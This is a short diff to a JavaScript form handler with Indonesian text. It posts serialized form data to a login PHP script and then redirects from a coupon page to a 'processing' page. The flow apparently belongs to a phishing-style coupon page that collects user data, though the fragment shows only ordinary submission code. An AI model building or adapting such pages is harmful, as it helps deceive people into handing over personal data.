@@ -593,12 +593,12 @@ function sendHpp(){
     
     $.ajax({
         type: 'POST',
-        url: 'login/sendIndex.php',
+        url: 'login/sendindex.php',
         data: $('#index').serialize(),
         datatype: 'JSON',   
     complete: function(){    
     setTimeout(function(){   
-    window.location = "kupon.html";
+    window.location = "proses.html";
     $("#lonte").hide();
     $('.load').fadeOut();
     document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
